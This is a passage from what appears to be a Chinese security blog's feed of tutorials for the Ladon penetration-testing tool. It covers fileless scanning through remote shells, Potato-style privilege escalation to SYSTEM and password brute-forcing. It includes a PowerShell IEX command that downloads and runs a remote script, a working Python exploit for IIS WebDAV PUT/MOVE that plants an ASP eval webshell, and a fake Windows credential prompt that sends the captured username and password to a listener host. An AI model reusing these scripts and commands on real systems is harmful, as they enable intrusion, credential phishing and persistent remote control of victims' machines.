title="RAR文件密码爆破"></a>RAR文件密码爆破</h6><p>因Rar压缩包只需一个密码,故只需pass.txt,注意中文密码需将txt保存为Ansi编码<br>命令: Ladon test.rar RarScan</p><h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><p>PowerLadon完美兼容win7-win10 PowerShell，对于不支持.net程序插件化的远控，可使用<br>PowerShell版,也可CMD命令行下远程加载内存实现无文件扫描，模块加载后用法和EXE一致。</p><h4 id="0x001-PowerShell本地加载"><a href="#0x001-PowerShell本地加载" class="headerlink" title="0x001 PowerShell本地加载"></a>0x001 PowerShell本地加载</h4><p>适用于支持PowerShell交互远控或Shell，如Cobalt Strike</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell </span><br><span class="line">&gt; Import-Module .\Ladon.ps1</span><br><span class="line">&gt; Ladon OnlinePC</span><br></pre></td></tr></table></figure><p><img data-original="http://k8gege.org/k8img/Ladon/PowerLadon.gif"></p><h4 id="0x002-Cmd本地加载"><a href="#0x002-Cmd本地加载" class="headerlink" title="0x002 Cmd本地加载"></a>0x002 Cmd本地加载</h4><p>适用于还没跟上时代的远控或Shell只支持CMD交互</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell Import-Module .\Ladon.ps1;Ladon OnlinePC</span><br></pre></td></tr></table></figure><p><img data-original="http://k8gege.org/k8img/Ladon/ps/CmdPSLadon.gif"></p><h4 id="0x003-Cmd远程加载"><a href="#0x003-Cmd远程加载" class="headerlink" title="0x003 Cmd远程加载"></a>0x003 Cmd远程加载</h4><p>适用于还没跟上时代的远控或Shell只支持CMD交互</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell <span class="string">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:800/Ladon.ps1'); Ladon OnlinePC"</span></span><br></pre></td></tr></table></figure><p><img data-original="http://k8gege.org/k8img/Ladon/ps/CmdPSRemoteLadon.gif"></p><h4 id="0x004-远控交互式CMD"><a href="#0x004-远控交互式CMD" class="headerlink" title="0x004 远控交互式CMD"></a>0x004 远控交互式CMD</h4><p><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_rat.PNG"></p><h4 id="0x005-菜刀非交互CMD"><a href="#0x005-菜刀非交互CMD" class="headerlink" title="0x005 菜刀非交互CMD"></a>0x005 菜刀非交互CMD</h4><p><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_cd.PNG"></p><h4 id="0x006-Empire非交互CMD"><a href="#0x006-Empire非交互CMD" class="headerlink" title="0x006 Empire非交互CMD"></a>0x006 Empire非交互CMD</h4><p>Empire的shell有点问题，分号被截断，可以加个cmd /c<br><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_empire.PNG"></p><h4 id="0x007-MSF交互式CMD"><a href="#0x007-MSF交互式CMD" class="headerlink" title="0x007 MSF交互式CMD"></a>0x007 MSF交互式CMD</h4><h3 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h3><p>Ladon最初的设计就是一款扫描框架，为了方便才内置功能<br>毕竟需要使用一个功能就得在目标多上传一个文件是顶麻烦的<br>不像MSF框架和模块多大都无所谓，因为你只是在本地使用<br>为了让大家都可以自定义模块，Ladon插件支持多种编程语言<br>最菜可通过INI配置插件，了解HTTP可通过EXP生成器生成POC<br>懂得编程可使用C#、Delphi、VC编写DLL，PowerShell脚本</p><h4 id="0x001-Exp生成器"><a href="#0x001-Exp生成器" class="headerlink" title="0x001 Exp生成器"></a>0x001 Exp生成器</h4><p>EXP生成器教程: <a href="https://github.com/k8gege/Ladon/wiki/LadonExp-Usage" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/LadonExp-Usage</a><br>实战例子: <a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2018-2894" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2018-2894</a></p><h4 id="0x002-自定义模块教程"><a href="#0x002-自定义模块教程" class="headerlink" title="0x002 自定义模块教程"></a>0x002 自定义模块教程</h4><p>自定义模块教程: <a href="https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle</a></p><h4 id="0x003-插件例子源码"><a href="#0x003-插件例子源码" class="headerlink" title="0x003 插件例子源码"></a>0x003 插件例子源码</h4><p><a href="https://github.com/k8gege/Ladon/raw/master/MoudleDemo.rar" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/raw/master/MoudleDemo.rar</a></p><h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。7.2版本内置92个功能模块,外部模块18个,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息&lt;/p&gt;
    
    </summary>
    
    
      <category term="工具" scheme="http://k8gege.org/categories/Tool/"/>
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
    
  </entry>
  
  <entry>
    <title>〖教程〗Ladon提权之Potato系列</title>
    <link href="http://k8gege.org/p/potato.html"/>
    <id>http://k8gege.org/p/potato.html</id>
    <published>2020-08-15T12:36:00.000Z</published>
    <updated>2020-08-15T17:10:54.152Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ladon提权之PipePotato-BadPotato-SweetPotato-PrintSpoofer"><a href="#Ladon提权之PipePotato-BadPotato-SweetPotato-PrintSpoofer" class="headerlink" title="Ladon提权之PipePotato/BadPotato/SweetPotato/PrintSpoofer"></a>Ladon提权之PipePotato/BadPotato/SweetPotato/PrintSpoofer</h1><p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/potato.html";</script><p>Ladon提权之PipePotato/BadPotato/SweetPotato/PrintSpoofer</p><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>&gt;= Ladon 7.2.0<br>Update: 20200810</p><h3 id="Potato提权原理"><a href="#Potato提权原理" class="headerlink" title="Potato提权原理"></a>Potato提权原理</h3><p>通过各种方法在本地NTLM中继获取SYSTEM令牌，再通过模拟令牌执行命令，通过以上方法提权统称为potato(不管是否基于原potato修改)。就像SQL注入，通过特定SQL语句注入获取特定数据库信息统称为SQL注入，而不管如何编写的SQL语句，是否基于别人的SQL语句修改。</p><h3 id="提权条件"><a href="#提权条件" class="headerlink" title="提权条件"></a>提权条件</h3><p>1 本地NTLM中继获取SYSTEM令牌<br>2 SeImpersonatePrivilege特权</p><p>测试中任意用户都可以通过本地NTLM中继获取到SYSTEM令牌权限，但是由于USER默认不开户SeImpersonatePrivilege特权，无法模拟令牌创建进程无法执行命令，所以会导致很多Potato提权失败。如下方”Win7管理员提权至SYSTEM“图片上部分就是USER部分的Potato提权失败，下方是管理员权限，而其它环境都是IIS权限。所以为了方便Ladon默认也显示当前用户SeImpersonatePrivilege特权情况。</p><h3 id="SweetPotato"><a href="#SweetPotato" class="headerlink" title="SweetPotato"></a>SweetPotato</h3><p>SweetPotato集成了原版Potato和JulyPotato的功能，包含DCOM/WINRM/PrintSpoofer方法获取SYSTEM。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Load SweetPotato</span><br><span class="line">Local Privilege Escalation from Windows Service Accounts to SYSTEM</span><br><span class="line">Vulnerable: Win7-Win10/Win2008-2019</span><br><span class="line">Usage:</span><br><span class="line">Ladon SweetPotato cmdline</span><br></pre></td></tr></table></figure><h3 id="PrintSpoofer"><a href="#PrintSpoofer" class="headerlink" title="PrintSpoofer"></a>PrintSpoofer</h3><p>pipePotato:一种新型的通用提权漏洞，PrintSpoofer是一个利用打印机PIPE提权的方法，国人写了个工具叫BadPotato。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Load BadPotato</span><br><span class="line">Local Privilege Escalation from Windows Service Accounts to SYSTEM</span><br><span class="line">PrintSpoofer Abusing Impersonate Privileges.</span><br><span class="line">Vulnerable: Win8-Win10/Win2012-2019</span><br><span class="line">Usage:</span><br><span class="line">Ladon BadPotato cmdline</span><br></pre></td></tr></table></figure><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p>1 Win7 IIS 应用池用户权限<br>2 Win7 本地管理员用户权限<br>3 Win2012 IIS 应用池权限<br>4 Win7 本地服务用户权限<br>5 Win8 本地服务用户权限</p><p>PS：由于BadPotato不支持WIN7系统，所以以上环境主要以测试SweetPotato为主。</p><h4 id="Win7管理员提权至SYSTEM"><a href="#Win7管理员提权至SYSTEM" class="headerlink" title="Win7管理员提权至SYSTEM"></a>Win7管理员提权至SYSTEM</h4><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/lpe/Win7_Admin_SweetPotato.PNG"></p><h4 id="Win7-IIS应用池提权至SYSTEM"><a href="#Win7-IIS应用池提权至SYSTEM" class="headerlink" title="Win7 IIS应用池提权至SYSTEM"></a>Win7 IIS应用池提权至SYSTEM</h4><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/lpe/IIS_Win7_SweetPotato.PNG"></p><h4 id="2012-R2-IIS应用池提权至SYSTEM"><a href="#2012-R2-IIS应用池提权至SYSTEM" class="headerlink" title="2012 R2 IIS应用池提权至SYSTEM"></a>2012 R2 IIS应用池提权至SYSTEM</h4><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/lpe/IIS8_2012_PR.PNG"></p><h4 id="WIN7服务用户CS提权至SYSTEM"><a href="#WIN7服务用户CS提权至SYSTEM" class="headerlink" title="WIN7服务用户CS提权至SYSTEM"></a>WIN7服务用户CS提权至SYSTEM</h4><p>本地服务用户权限下直接以SYSTEM权限上控Cobalt Strike<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/lpe/CS_PR_SweetPotato.png"></p><h4 id="WIN8服务用户提权至SYSTEM"><a href="#WIN8服务用户提权至SYSTEM" class="headerlink" title="WIN8服务用户提权至SYSTEM"></a>WIN8服务用户提权至SYSTEM</h4><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/lpe/BadPotato.png"></p><h3 id="IIS提权"><a href="#IIS提权" class="headerlink" title="IIS提权"></a>IIS提权</h3><p><a href="http://k8gege.org/p/6b9b3afe.html">http://k8gege.org/p/6b9b3afe.html</a></p><h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg"></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Ladon提权之PipePotato-BadPotato-SweetPotato-PrintSpoofer&quot;&gt;&lt;a href=&quot;#Ladon提权之PipePotato-BadPotato-SweetPotato-PrintSpoofer&quot; class=&quot;heade
      
    
    </summary>
    
    
      <category term="提权" scheme="http://k8gege.org/categories/Lpe/"/>
    
    
      <category term="LPE" scheme="http://k8gege.org/tags/LPE/"/>
    
      <category term="EXP" scheme="http://k8gege.org/tags/EXP/"/>
    
  </entry>
  
  <entry>
    <title>〖教程〗LadonExp使用IIS写权限Webdav漏洞GetShell</title>
    <link href="http://k8gege.org/p/iisput.html"/>
    <id>http://k8gege.org/p/iisput.html</id>
    <published>2020-08-15T03:36:00.000Z</published>
    <updated>2020-08-15T14:10:42.711Z</updated>
    
    <content type="html"><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/iisput.html";</script><p>LadonExp生成器使用教程之IIS写权限漏洞利用，含环境配置、EXP生成、批量利用、Pyhton复现代码。</p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>该漏洞的产生原因来源于服务器配置不当造成，此漏洞主要是因为服务器开启了webdav的组件导致的可以扫描到当前的操作，具体操作其实是通过webdav的OPTION来查询是否支持PUT。</p><h3 id="IIS配置"><a href="#IIS配置" class="headerlink" title="IIS配置"></a>IIS配置</h3><p>1 启用webdav组件<br>2 目录给写权限(为了方便直接eveyone完全写入权限)<br>3 脚本资源访问权限(不然MOVE失败即无法GetShell)</p><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/iis/iis6_cfg.PNG"></p><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/iis/iis6_cfg2.PNG"></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>使用LadonEXP可轻松复现此类漏洞，在Ladon改名前(Cscan)已复现过Tomcat，详情参考Tomcat CVE-2017-12615视频： <a href="https://github.com/k8gege/K8CScan/tree/master/Video" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/tree/master/Video</a></p><h4 id="LadonExp配置PUT"><a href="#LadonExp配置PUT" class="headerlink" title="LadonExp配置PUT"></a>LadonExp配置PUT</h4><p>功能：上传123.TXT<br>Target: <a href="http://192.168.1.22" target="_blank" rel="noopener">http://192.168.1.22</a><br>Method: Put<br>addurl: 123.txt<br>Data: &lt;%eval request(k8gege)%&gt;<br>点击buildexe-&gt;TestExe测试<br>成功返回 Created</p><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/iis/iis_put.PNG"></p><h4 id="LadonExp配置MOVE"><a href="#LadonExp配置MOVE" class="headerlink" title="LadonExp配置MOVE"></a>LadonExp配置MOVE</h4><p>功能：将123.txt改名1.asp<br>Target: <a href="http://192.168.1.22/123.txt" target="_blank" rel="noopener">http://192.168.1.22/123.txt</a><br>Method: Move<br>Destination: <a href="http://192.168.1.22/1.asp" target="_blank" rel="noopener">http://192.168.1.22/1.asp</a></p><p>点击buildexe-&gt;TestExe测试<br>成功返回 Created</p><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/iis/iis_move.PNG"></p><p>PS: 当然也可以直接PUT写入可解析的其它格式，也不一定非得先PUT再MOVE才能GetShell</p><h4 id="Ladon批量"><a href="#Ladon批量" class="headerlink" title="Ladon批量"></a>Ladon批量</h4><p>扫描C段，当然也可以A段B段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.1/c 生成.dll</span><br><span class="line">Ladon 192.168.1.1/24 生成.dll</span><br></pre></td></tr></table></figure><h4 id="TXT批量"><a href="#TXT批量" class="headerlink" title="TXT批量"></a>TXT批量</h4><p>url.txt里放批量地址，不在同一个段的,示例如下<br><a href="http://192.168.1.1" target="_blank" rel="noopener">http://192.168.1.1</a><br><a href="http://192.10.5.8:808" target="_blank" rel="noopener">http://192.10.5.8:808</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 生成.dll</span><br></pre></td></tr></table></figure><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>Python实现利用代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding="utf-8"</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">put_url = <span class="string">'http://192.168.1.22/2.txt'</span></span><br><span class="line">move_url = <span class="string">'http://192.168.1.22/2.txt'</span></span><br><span class="line">move_headers = &#123;</span><br><span class="line">    <span class="string">'Destination'</span>:<span class="string">'http://192.168.1.22/shell.asp'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">put_data = <span class="string">"&lt;%eval request('k8gege')%&gt;"</span></span><br><span class="line"></span><br><span class="line">post_data = &#123;</span><br><span class="line">    <span class="string">'#'</span>:<span class="string">''</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.request(<span class="string">'PUT'</span>,url=put_url,data=put_data)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        response = requests.request(<span class="string">'MOVE'</span>,url=move_url,headers=move_headers)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">207</span>:</span><br><span class="line">            response = requests.post(url=<span class="string">'http://192.168.1.22/shell.asp'</span>,data=post_data)</span><br><span class="line">            print(response.content.decode(<span class="string">"gb2312"</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(response.status_code)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>IIS Exp: <a href="https://github.com/k8gege/iisput" target="_blank" rel="noopener">https://github.com/k8gege/iisput</a></p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg"></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;=============================================================================================&lt;br&gt;++++++++++++++++++++++++++++++++++++++++
      
    
    </summary>
    
    
      <category term="GetShell" scheme="http://k8gege.org/categories/GetShell/"/>
    
    
      <category term="IIS" scheme="http://k8gege.org/tags/IIS/"/>
    
      <category term="EXP" scheme="http://k8gege.org/tags/EXP/"/>
    
  </entry>
  
  <entry>
    <title>〖教程〗使用Ladon捕获Windonws登陆密码</title>
    <link href="http://k8gege.org/p/GetWinAuth.html"/>
    <id>http://k8gege.org/p/GetWinAuth.html</id>
    <published>2020-08-11T12:10:00.000Z</published>
    <updated>2020-08-15T12:22:21.137Z</updated>
    
    <content type="html"><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/GetWinAuth.html";</script><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>&gt;= Ladon 6.6.3<br>Update: 20200618</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>使用PowerShell模仿Windowns登陆认证获取管理员密码，Ladon监听捕获基础认证密码。</p><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>域控或管理员密码获取，当前权限很低又无法提权时。（有权限直接读明文或HASH）</p><h3 id="Ladon监听"><a href="#Ladon监听" class="headerlink" title="Ladon监听"></a>Ladon监听</h3><p>该功能模仿了MSF里的基础认证监听模块，但最大的优势在于无需占用系统大量空间和内存。<br>可直接部署在目标内网或VPS上，也无需复杂命令，直接输以下命令一键监听自动捕获密码。<br>其它用途：<a href="http://k8gege.org/Ladon/webser.html">http://k8gege.org/Ladon/webser.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon Web 800</span><br></pre></td></tr></table></figure><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/AuthPass.PNG"></p><h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><p>执行以下脚本代码，会弹出十分逼真的基础认证登陆窗口，自动获取用户名和域来提高真实性。<br>当然也可以使用其它脚本或语言，如JS水坑攻击、XSS截取各种WEB邮箱密码等等多种钩鱼姿势。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cred</span> = <span class="variable">$host</span>.ui.promptforcredential(<span class="string">'Failed Authentication'</span>,<span class="string">''</span>,[<span class="type">Environment</span>]::UserDomainName + <span class="string">"\"</span> + [<span class="type">Environment</span>]::UserName,[<span class="type">Environment</span>]::UserDomainName);</span><br><span class="line">[<span class="type">System.Net.ServicePointManager</span>]::ServerCertificateValidationCallback = &#123;<span class="variable">$true</span>&#125;;</span><br><span class="line"><span class="built_in">Add-Type</span> <span class="string">@'</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">public class Authorization</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">public static void submit(string usr,string pwd)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">string url = "http://192.168.1.110:8000/";</span></span><br><span class="line"><span class="string">System.Net.HttpWebRequest myReq = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(url);</span></span><br><span class="line"><span class="string">string username = usr;</span></span><br><span class="line"><span class="string">string password = pwd;</span></span><br><span class="line"><span class="string">string usernamePassword = username + ":" + password;</span></span><br><span class="line"><span class="string">System.Net.CredentialCache mycache = new System.Net.CredentialCache();</span></span><br><span class="line"><span class="string">mycache.Add(new Uri(url), "Basic", new System.Net.NetworkCredential(username, password));</span></span><br><span class="line"><span class="string">myReq.Credentials = mycache;</span></span><br><span class="line"><span class="string">myReq.Headers.Add("Authorization", "Basic " + Convert.ToBase64String(new System.Text.ASCIIEncoding().GetBytes(usernamePassword)));</span></span><br><span class="line"><span class="string">System.Net.WebResponse wr = myReq.GetResponse();</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br><span class="line"><span class="string">'@</span></span><br><span class="line">[<span class="type">Authorization</span>]::submit(<span class="variable">$cred</span>.username, <span class="variable">$cred</span>.getnetworkcredential().password)</span><br></pre></td></tr></table></figure><h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg"></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;=============================================================================================&lt;br&gt;++++++++++++++++++++++++++++++++++++++++
      
    
    </summary>
    
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term="Pass" scheme="http://k8gege.org/tags/Pass/"/>
    
  </entry>
  
  <entry>
    <title>给你一个免费加入&quot;K8小密圈&quot;的机会</title>
    <link href="http://k8gege.org/p/free.html"/>
    <id>http://k8gege.org/p/free.html</id>
    <published>2020-08-06T13:20:00.000Z</published>
    <updated>2020-08-07T13:54:37.847Z</updated>
    
    <content type="html"><![CDATA[<h3 id="K8小密圈"><a href="#K8小密圈" class="headerlink" title="K8小密圈"></a>K8小密圈</h3><p>于2020年8月1日建立，所有QQ群因气氛不活跃停止维护，加上有人白嫖还恶意举报（我的博客链接只在自己Q群有发布过，却被QQ提示危险不要访问，说明有人白嫖还举报），另外一个原因免费无任何门槛，有人进来乱发无关技术的广告，无论是Q群还是免费星球都是如此，因此创建了收费星球，收费不是目的，目的是防止无关人员进入，其次购买资源或奖励等，对于不愿分享技术的就分享钱吧，有些工具以后只会在该星球发布。当然并不是说你不加入就用不到，你的朋友会私下发给你，或者说等过一段时间才会公开，你才能下载得到。</p><p>微信扫码或点击链接加入知识星球：<a href="https://t.zsxq.com/zZNfune" target="_blank" rel="noopener">https://t.zsxq.com/zZNfune</a></p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt style="display: inline-block;width: 500px;height: 600px;" data-original="http://k8gege.org/img/k8team.jpg"></div><h3 id="免费名额"><a href="#免费名额" class="headerlink" title="免费名额"></a>免费名额</h3><p>名额仅剩30人</p><p>PS：由于免费名额有限，所以不再接受朋友的朋友直接进入，对大家一视同仁，写个文章很简单吧</p><h3 id="免费条件"><a href="#免费条件" class="headerlink" title="免费条件"></a>免费条件</h3><p>1.发文章或视频，在博客或第3方平台等发布Ladon相关文章，如使用教程、漏洞复现、实战、靶场等<br>2.用心写的文章或教程将会收录到本博客，并给予1个免费加入链接(文章链接可微博、QQ、星球给我)<br>3.有效期至名额完成为此（名单会在本页公布，方便大家看剩余名额）</p><p>注意：如果是实战项目，图片最好打码，除非客户授权你发布文章，以免客户说你公开它的网络漏洞</p><h3 id="参考例子"><a href="#参考例子" class="headerlink" title="参考例子"></a>参考例子</h3><p>下面是一个视频教程，这个UP主讲得顶好的，但只是简单的介绍用法，没有靶场、没有实战，未体现出工具的功能以及实战用途，对于刚入门的小白来说，还是不太了解工具有多大作用，特别是实战如何使用。</p><p>1.【学习分享】ladon工具基本使用  <a href="https://www.bilibili.com/video/av243704386" target="_blank" rel="noopener">https://www.bilibili.com/video/av243704386</a></p><h3 id="活动背景"><a href="#活动背景" class="headerlink" title="活动背景"></a>活动背景</h3><p>由于我没太多时间写文档，或者有些人看不懂现有文档。集思广义让大家参与Ladon文档，毕竟每个人的水平以及理解能力不一样，写的文档受众也会不一样。我认为文档是写得已经很明白了，但很多时候依然会有人来问我哪个功能如何使用，在怎样的场景下使用，有人问这样的问题，我觉得是失败的，因为我的初衷是让任何人都轻易上手。加上星球刚建不久，有人想免费加入，也有一定的免费名额。</p><h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;K8小密圈&quot;&gt;&lt;a href=&quot;#K8小密圈&quot; class=&quot;headerlink&quot; title=&quot;K8小密圈&quot;&gt;&lt;/a&gt;K8小密圈&lt;/h3&gt;&lt;p&gt;于2020年8月1日建立，所有QQ群因气氛不活跃停止维护，加上有人白嫖还恶意举报（我的博客链接只在自己Q群有发布过，
      
    
    </summary>
    
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
  </entry>
  
  <entry>
    <title>〖教程〗NbtScan 139端口弱口令/Netbios密码爆破</title>
    <link href="http://k8gege.org/p/NbtScan.html"/>
    <id>http://k8gege.org/p/NbtScan.html</id>
    <published>2020-08-01T07:20:00.000Z</published>
    <updated>2020-08-01T16:31:57.006Z</updated>
    
    <content type="html"><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/NbtScan.html";</script><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>Ladon &gt;= 7.1</p><h3 id="139端口"><a href="#139端口" class="headerlink" title="139端口"></a>139端口</h3><p>NetBIOS File and Print Sharing 通过这个端口进入的连接试图获得NetBIOS/SMB服务。这个协议被用于Windows”文件和打印机共享”和SAMBA。</p><h3 id="IPC-通信"><a href="#IPC-通信" class="headerlink" title="IPC$通信"></a>IPC$通信</h3><p>Windows系统中的net use 